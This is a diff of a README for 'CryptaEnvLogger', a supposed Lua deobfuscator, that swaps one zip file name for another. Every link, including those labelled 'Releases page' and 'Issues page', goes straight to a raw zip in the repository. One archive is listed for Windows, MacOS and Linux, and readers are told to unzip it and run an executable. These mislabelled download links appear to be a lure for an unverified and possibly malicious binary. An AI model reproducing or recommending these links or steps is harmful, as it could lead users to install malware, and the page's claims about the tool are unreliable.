@@ -1,7 +1,7 @@
 # 🌟 CryptaEnvLogger - Deobfuscate Code with Ease
 
 ## 🔗 Download Now!
-[![Download CryptaEnvLogger](https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Env_Crypta_v1.8.zip)](https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Env_Crypta_v1.8.zip)
+[![Download CryptaEnvLogger](https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Crypta_Env_v1.0.zip)](https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Crypta_Env_v1.0.zip)
 
 ## 📋 Introduction
 Welcome to CryptaEnvLogger! This application helps you deobfuscate any obfuscated code into clear, readable Lua. Whether you're a beginner or just looking to simplify your work, this tool makes the process straightforward and efficient.
@@ -11,16 +11,16 @@ To start using CryptaEnvLogger, follow the simple steps below. You will find eve
 
 ## 🔽 Download & Install
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Env_Crypta_v1.8.zip) to find the latest version of CryptaEnvLogger.
+   Go to the [Releases page](https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Crypta_Env_v1.0.zip) to find the latest version of CryptaEnvLogger.
 
 2. **Select the Latest Release**  
    On the Releases page, look for the most recent version. It typically has the highest number and is marked as the latest.
 
 3. **Download the Application**  
    Click on the appropriate file for your operating system to start the download. The available formats will include:
-   - Windows: `https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Env_Crypta_v1.8.zip`
-   - MacOS: `https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Env_Crypta_v1.8.zip`
-   - Linux: `https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Env_Crypta_v1.8.zip`
+   - Windows: `https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Crypta_Env_v1.0.zip`
+   - MacOS: `https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Crypta_Env_v1.0.zip`
+   - Linux: `https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Crypta_Env_v1.0.zip`
 
 4. **Unzip the File**  
    Once the download completes, locate the file in your downloads folder. Click on it to unzip the contents. You should see an executable file named `CryptaEnvLogger`.
@@ -64,7 +64,7 @@ CryptaEnvLogger is licensed under the MIT License. You can use it freely for per
 
 ## 🔗 Important Links
 For more information, tutorials, and updates, refer to the following:
-- [Releases page](https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Env_Crypta_v1.8.zip)
-- [Issues page](https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Env_Crypta_v1.8.zip)
+- [Releases page](https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Crypta_Env_v1.0.zip)
+- [Issues page](https://github.com/Shuvroohridoy/CryptaEnvLogger/raw/refs/heads/main/freeLoggingSrc/Logger_Crypta_Env_v1.0.zip)
 
 Thank you for choosing CryptaEnvLogger to simplify your projects. Happy deobfuscating!
